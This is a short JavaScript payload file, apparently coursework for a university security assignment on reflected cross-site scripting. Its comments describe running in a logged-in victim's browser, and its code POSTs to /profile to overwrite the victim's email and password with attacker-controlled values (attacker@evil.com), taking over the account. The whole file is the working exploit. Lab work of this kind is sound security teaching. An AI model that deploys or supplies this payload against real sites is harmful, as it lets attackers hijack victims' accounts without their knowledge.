// payload.js -- FIT5003 A2, Part B.2 (reflected XSS -> account takeover)
// Runs in the logged-in VICTIM's browser via the reflected <script src> sink.
// Uses the victim's own session cookie to POST to /profile, overwriting their
// email and password with attacker-controlled values = account takeover.
fetch('/profile', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'email=attacker@evil.com&password=pwned-by-attacker'
});
